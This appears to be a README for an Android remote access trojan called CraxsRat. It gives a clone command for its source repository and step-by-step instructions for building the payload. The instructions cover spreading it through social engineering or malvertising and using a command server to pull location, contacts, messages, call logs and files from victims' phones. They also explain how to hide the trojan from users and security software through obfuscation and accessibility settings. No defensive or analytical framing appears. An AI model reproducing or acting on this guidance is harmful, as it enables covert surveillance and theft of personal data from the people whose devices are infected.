### Requirements

- Android device (target)
- Builder application to create the RAT payload

### Setup

1. **Clone the Repository**:
   ```sh
   git clone https://github.com/maxamin/CraxsRat-v6.7-Source-Code.git
   cd craxsrat-source-code
   ```

2. **Builder Configuration**:
   - Follow the instructions in the builder directory to set up and configure the RAT payload.
   - Customize the payload to suit your specific requirements.

3. **Payload Deployment**:
   - Distribute the RAT payload through social engineering, malvertising, or other methods.
   - Ensure the payload is installed on the target device.

## Usage

1. **Control the Infected Device**:
   - Use the command and control (C2) server to send commands to the infected device.
   - Retrieve location, contacts, messages, call logs, and access stored files.

2. **Maintain Persistence**:
   - Utilize the obfuscation features to keep the RAT hidden from the user and security software.
   - Ensure the RAT's accessibility settings are enabled to maintain control over the device.
